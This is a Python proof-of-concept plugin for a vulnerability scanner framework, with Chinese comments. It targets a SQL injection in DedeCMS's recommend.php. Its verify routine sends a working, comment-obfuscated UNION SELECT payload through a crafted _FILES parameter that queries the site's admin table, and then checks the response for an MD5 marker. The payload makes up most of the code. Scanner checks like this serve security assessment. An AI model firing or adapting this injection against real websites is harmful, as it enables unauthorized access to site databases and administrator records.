# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0002'  # 平台漏洞编号，留空
    name = '织梦CMS recommend.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-03-27'  # 漏洞公布时间
    desc = '''
        织梦CMS 全版本存在 SQL注入漏洞，注入位置：
        /plus/recommend.php?aid=.
    '''  # 漏洞描述
    ref = 'http://www.hackdig.com/?03/hack-8931.htm'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '所有版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4ba92095-60d9-4ffe-b63f-52cc0d1faa6f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            _, head, body, _, _ = hh.http(
                self.target + '/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20`%23@__admin`%23')
            if body and body.find('2e0e20673083dea5cc87a85d54022049') != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
